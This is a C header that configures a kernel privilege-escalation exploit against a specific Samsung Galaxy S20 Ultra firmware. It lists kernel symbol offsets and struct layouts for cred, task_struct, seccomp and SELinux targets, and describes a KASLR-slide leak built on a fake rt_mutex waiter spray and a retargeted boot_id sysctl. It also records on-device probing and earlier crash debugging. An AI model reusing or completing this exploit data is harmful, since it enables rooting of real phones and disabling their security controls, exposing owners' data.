#ifndef TARGET_H
#define TARGET_H

/*
 * Target: Samsung Galaxy S20 Ultra SM-G988U (z3q, Snapdragon 865)
 *   firmware: G988USQSDHYG2 (final build, SPL 2025-03-01, One UI 5 / Android 13)
 *   kernel  : Linux version 4.19.113-27095354 (clang 10.0.6) #1 SMP PREEMPT
 *             Thu Jul 17 23:41:36 KST 2025
 *   boot hdr: ANDROID! v2 (boot.img from AP_G988USQSDHYG2)
 *
 * Provenance — every [A] value is extracted from the target boot.img:
 *   kallsyms via vmlinux-to-elf (144,640 symbols), .rela.dyn relocation
 *   table for runtime-relocated pointers, config from device /proc/config.gz.
 *   [B] struct offsets from pahole on a gcc build of the z3q source
 *   (savox-326/G988U_android13_kernel) with the exact device .config.
 *   [C] 4.19 upstream definition (version-stable).
 *   [D] runtime-tunable, confirm via on-device logs.
 *
 * Companion tools in this repo:
 *   tools/derive_slide_gadgets.py  — SLIDE_* values from vmlinux + .rela.dyn
 *   tools/extract_symbols.sh       — [A] symbol offsets via nm
 */

#define BUILD_VARIANT_LABEL "samsung_z3q_4.19.113_a13"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "samsung/G988U/q3q:13/TP1A.220624.014.G988USQSDHYG2:user/release-keys"
#endif

/* ---------------- address space ----------------
 * VERIFIED ON DEVICE (tools/prefetch_probe.c, EL0 PRFM TLB-timing sweep of
 * the full TTBR1 space, 2026-11-05 run): the kernel is built for the VA39
 * layout, not VA48:
 *   PAGE_OFFSET (linear map base) = 0xffffffc000000000
 *     (= 0xffffffffffffffff - (1 << 38) + 1, the stock arm64 VA39 constant)
 *   vmalloc/image region         = [0xffffff8000000000, 0xffffffc000000000)
 *     kernel image links at 0xffffff8008080000 (KIMAGE_TEXT_BASE below)
 *   vmemmap                      = 0xffffffbf00000000 (= PAGE_OFFSET - 4GB,
 *     the stock VMEMMAP_START for VA39/4K; probed hot 12/12 passes -
 *     struct pages are touched by the kernel constantly)
 * The sweep also showed the image running AT ITS LINK ADDRESS this boot
 * (5 hot-text hits inside the link span, none elsewhere): slide = 0 for
 * this boot. The slide is per-boot random, so the slide stage still runs,
 * but at slide = 0 every *_IMAGE macro below is already the runtime VA.
 *
 * All earlier device panics are explained: the old constants assumed the
 * VA48 PAGE_OFFSET 0xffffff8000000000, so every planted "alias" VA was
 * ~264GB away from any mapping and the first rt_mutex walk deref faulted.
 *
 * Linear-map math: linear_VA(phys) = PAGE_OFFSET + (phys - memstart_addr),
 * memstart_addr = dram base (0x80000000) minus the per-boot memstart
 * randomization draw (1GB steps). The prefetch sweep's hot-heap cluster
 * [PO+0.78G, PO+10.98G] bounds the draw to {2,3} this boot; exact value
 * comes from the leak chain once reads work.
 */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL          /* [A] kallsyms _text */
#define P0_PAGE_OFFSET 0xffffffc000000000ULL             /* [A][probe] VA39 PAGE_OFFSET, sweep-verified */
#define P0_PHYS_OFFSET 0x80000000ULL                     /* [D] memstart_addr base = DRAM base */
#define P0_KERNEL_PHYS_LOAD 0xA0001000ULL              /* [A] kaslr_region node base (aboot-injected) */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] vmalloc+linear span */
#define DIRECT_MAP_BASE 0xffffffc000000000ULL           /* [probe] linear map base */
#define DIRECT_MAP_END 0xffffffc400000000ULL           /* [B] 16GB window */
#define VMEMMAP_START 0xffffffbf00000000ULL             /* [probe] VA39 vmemmap, hot 12/12 */

#define PSELECT_WAITER_WORD_SHIFT 1                     /* [D] stack-frame tuning, confirm at runtime */

/* ---------------- round-2 adaptation switches (4.19) ---------------- */
#define CFGOPS_4_19_STYLE 1        /* configfs_read_file/write_bin_file at .read/.write (not iter) */
#define KMALLOC_419 1              /* 3 cache types (NORMAL/RECLAIM/DMA), no cg caches */
#define KMALLOC_PIPE_INDEX 10       /* legacy pipe 16-slot bufs array: 16*0x28=640B -> kmalloc-1024 */
#define KMALLOC_PIPE_OBJ_SIZE 0x400
#define KMALLOC_CACHE_TYPES 3
#define ASHMEM_NAME_PREFIX_LEN 0    /* z3q ashmem: verify prefix semantics at runtime (K40 oplus=0) */
#define ASHMEM_PREFIX_COUNT 0
#define MM_STRUCT_SZ 0x3d0                              /* [B] real: proc_caches_init size=976 */

/* ---------------- symbol offsets (off = sym - KIMAGE_TEXT_BASE) ----------------
 * Extracted via tools/extract_symbols.sh from the boot.img vmlinux.
 */
#define ASHMEM_MISC_FOPS_OFF 0x02ce51d8ULL              /* [A] ashmem_misc + 0x10 = miscdevice.fops slot */
#define ASHMEM_FOPS_OFF 0x01aec128ULL                  /* [A] ashmem_fops */
#define ASHMEM_IOCTL_OFF 0x00eb83f4ULL                 /* [A] ashmem_ioctl */
#define ASHMEM_COMPAT_IOCTL_OFF 0x00eb8c84ULL          /* [A] compat_ashmem_ioctl */
#define ASHMEM_MMAP_OFF 0x00eb8cdcULL                  /* [A] ashmem_mmap */
#define ASHMEM_OPEN_OFF 0x00eb8e5cULL                  /* [A] ashmem_open */
#define ASHMEM_RELEASE_OFF 0x00eb8ee4ULL               /* [A] ashmem_release */
#define ASHMEM_SHOW_FDINFO_OFF 0x00eb8fe4ULL           /* [A] ashmem_show_fdinfo */
#define CONFIGFS_READ_ITER_OFF 0x00316054ULL          /* [A] configfs_read_file (4.19: no read_iter) */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00316554ULL      /* [A] configfs_write_bin_file */
#define COPY_SPLICE_READ_OFF 0x0029fa64ULL            /* [A] generic_file_splice_read */
#define NOOP_LLSEEK_OFF 0x0025a43cULL                  /* [A] noop_llseek */
#define INIT_TASK_OFF 0x02baf980ULL                    /* [A] init_task */
#define INIT_UTS_NS_OFF 0x02baf748ULL                  /* [A] init_uts_ns */
#define EMPTY_ZERO_PAGE_OFF 0x02453000ULL              /* [A] empty_zero_page */
#define ROOT_TASK_GROUP_OFF 0x030cec00ULL              /* [A] root_task_group */
/* SELINUX: z3q 4.19 uses the pre-5.6 plain global `selinux_enforcing`
 * (verified: no selinux_state symbol in kallsyms; SECURITY_SELINUX_DEVELOP=y). */
#define SELINUX_ENFORCING_OFF 0x02456200ULL             /* [A] selinux_enforcing (int) */
#define SECURITY_HOOK_HEADS_OFF 0x02440b08ULL           /* [A] security_hook_heads */
#define KMALLOC_CACHES_OFF 0x02440608ULL                /* [A] kmalloc_caches (4.19: 3 types) */
#define ANON_PIPE_BUF_OPS_OFF 0x019a2900ULL             /* [A] anon_pipe_buf_ops */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---------------- KASLR slide gadget (4.19 rb-gadget path) ----------------
 * fake-waiter erase retargets random_table[boot_id].data -> &loggers[0][0];
 * reading /proc/sys/kernel/random/boot_id then hex-leaks the slid
 * &nfulnl_logger. All three values below are cross-validated against the
 * boot.img vmlinux (see tools/derive_slide_gadgets.py):
 *   loggers == nfulnl_logger - 0xd8 (nf_log.c layout, same as oplus K40)
 *   random_table entry[8] procname == "boot_id" (table links at
 *   0xffffff800accd890; slot = entry[8].data); .data addend == kallsyms
 *   sysctl_bootid — re-verified by hand 2026-11-05: nm random_table +
 *   .rela.dyn at off 0xffffff800accd998 -> addend 0xffffff800b2eacec
 */
#define SLIDE_NFULNL_LOGGER_OFF 0x02ba5ea0ULL           /* [A] */
#define SLIDE_LOGGERS_0_1_OFF 0x02ba5dc8ULL              /* [A] &loggers[0][0] */
/* [A] the qword pair just below random_table's boot_id .data slot.
 * NOTE: this build's struct ctl_table has a 0x40 stride (Samsung extra
 * fields), so the boot_id entry — nm/RELA verified, and matching the
 * original random_table[4] comment — sits at table+0x100 = link
 * 0xffffff800accd990 (procname -> the "boot_id" .rodata string at link
 * 0xffffff800a209a37; .data slot at +8 = 0xffffff800accd998, RELA
 * addend 0xffffff800b2eacec = the .bss uuid buffer). W1 aims the
 * boot_id .data slot at this pair: q0 = the previous entry's tail
 * field (content unknown, reported as noise), q1 = the boot_id
 * procname pointer = link 0xffffff800a209a37 + slide — the readback
 * leaks the slide directly (slide = q1 - 0xa209a37 link base). W2's
 * *(P+8)=C lands on the procname slot (dead after sysctl
 * registration), P+8 is writable .data, and byte 8 (the string
 * pointer's LSB, 0x37) is nonzero so proc_do_uuid serves the pair
 * instead of regenerating. Do NOT aim P at the boot_id entry's
 * proc_handler slot: W2 would overwrite it and the next sysctl read
 * would call a data address as a function. */
#define SLIDE_READ_PAIR_OFF 0x02c4d988ULL
/* [A] the "boot_id" procname .rodata string (RELA target of slot
 * 0xffffff800accd990) — the q1 leak anchor. */
#define SLIDE_BOOTID_STRING_OFF 0x02189a37ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02c4d998ULL      /* [A] random_table entry[8] ("boot_id") .data slot */
#define SLIDE_SYSCTL_BOOTID_OFF 0x0326acecULL            /* [A] sysctl_bootid buffer (.bss) */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_WONLY_BOOTID 1                             /* [D] */

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_READ_PAIR_IMAGE (KIMAGE_TEXT_BASE + SLIDE_READ_PAIR_OFF)
#define SLIDE_BOOTID_STRING_IMAGE (KIMAGE_TEXT_BASE + SLIDE_BOOTID_STRING_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------- slide mirror scratch ----------------
 * The GhostLock dangling waiter lives on the waiter task's kernel stack
 * (overlaid by the pselect fd_set copy), so the slide route never touches
 * heap-reclaimed memory: the only payload page the walk dereferences is
 * fake_lock, and only as an all-zero empty rt_mutex (wait_lock=0,
 * waiters.rb_root_cached=0, owner=0 — see prepare_skb_payload SLIDE branch).
 * The .bss tail gap [0xffffff800c0b2000, 0xffffff800c14a000) has no symbols
 * and zero adrp references from the entire kernel image (verified offline).
 * At slide = 0 (probe-verified this boot) the raw image VA is the runtime
 * VA directly: the earlier alias indirection was what made the first
 * device runs deref unmapped memory and panic at the slide child. */
#define SLIDE_MIRROR_MODE 1
#define SLIDE_MIRROR_LOCK_OFF 0x04070000ULL            /* [A] .bss tail gap, page-aligned */
#define SLIDE_MIRROR_LOCK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_MIRROR_LOCK_OFF)
#define SLIDE_MIRROR_LOCK SLIDE_MIRROR_LOCK_IMAGE      /* [probe] slide=0: raw image VA */

/* ---------------- exploit-internal spray layout (target-independent) ---------------- */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ---------------- rt_mutex_waiter (4.19 form, CONFIG_DEBUG_RT_MUTEXES unset) ----------------
 * {tree_entry@0, pi_tree_entry@0x18, task@0x30, lock@0x38, prio@0x40,
 *  deadline@0x48}, size 0x50. Verified identical in z3q
 * kernel/locking/rtmutex_common.h. [C] */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

/* fake waiter spray layout (kernel-consumed fields at the 4.19 offsets above) */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* ---------------- task_struct ---------------- TODO_PAHOLE
 * Samsung 4.19 z3q task_struct with CONFIG_SCHED_INFO=y,
 * FAIR_GROUP_SCHED=y + RT_GROUP_SCHED=y (K40 oplus values below as
 * placeholders — MUST be replaced from pahole before any device run).
 */
#define FAKE_TASK_USAGE_OFF 0x68
#define FAKE_TASK_PRIO_OFF 0xac
#define FAKE_TASK_NORMAL_PRIO_OFF 0xb4
#define FAKE_TASK_TASK_GROUP_OFF 0x3d8                  /* sched_task_group (CGROUP_SCHED) */
#define FAKE_TASK_PI_LOCK_OFF 0x8c8
#define FAKE_TASK_PI_WAITERS_OFF 0x8e0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8f0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8f8

#define TASK_PI_LOCK_OFF 0x8c8
#define TASK_PI_WAITERS_OFF 0x8e0
#define TASK_PI_TOP_TASK_OFF 0x8f0
#define TASK_PI_BLOCKED_ON_OFF 0x8f8

#define MM_OWNER_OFF 0x378                               /* mm_struct.owner */
#define TASK_PID_OFF 0x640
#define TASK_TGID_OFF 0x644
#define TASK_REAL_PARENT_OFF 0x650
#define TASK_ATOMIC_FLAGS_OFF 0x608
#define TASK_REAL_CRED_OFF 0x7f0
#define TASK_CRED_OFF 0x7f8
#define TASK_COMM_OFF 0x800
#define TASK_TASKS_OFF 0x540
#define TASK_THREAD_GROUP_OFF 0x688
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8a0

/* ---------------- configfs_buffer (4.19, fs/configfs/file.c) ---------------- [C] */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 96
#define CFG_BIN_BUFFER_OFF 104
#define CFG_BIN_BUFFER_SIZE_OFF 112
#define CFG_CB_MAX_SIZE_OFF 116

/* ---------------- cred / seccomp / selinux ---------------- [C] */
#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 36
#define CRED_CAPS_OFF 40
#define CRED_SECURITY_OFF 120
#define SELINUX_CRED_BLOB_OFF 0                         /* 4.19: direct task_security_struct* */
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11                              /* arm64 4.19 thread_info.h */
#define PFA_NO_NEW_PRIVS_BIT 0

/* ---------------- struct page ---------------- [C] */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

/* ---------------- pipe_inode_info (LEGACY pre-4.9 layout — z3q vendor quirk) ----------------
 * z3q include/linux/pipe_fs_i.h ships the legacy layout (nrbufs/curbuf/buffers),
 * same as oplus K40. Exact offsets from pahole. [B]
 */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 16
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb0
#define PIPE_INODE_INFO_SIZE 0xb0
#define PIPE_NRBUFS_OFF 0x60
#define PIPE_CURBUF_OFF 0x64
#define PIPE_BUFFERS_OFF 0x68
#define PIPE_READERS_OFF 0x6c
#define PIPE_WRITERS_OFF 0x70
#define PIPE_FILES_OFF 0x74
#define PIPE_TMP_PAGE_OFF 0x88
#define PIPE_BUFS_OFF 0xa0
#define PIPE_USER_OFF 0xa8

/* ---------------- file_operations (4.19) ---------------- [C] */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xc0
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
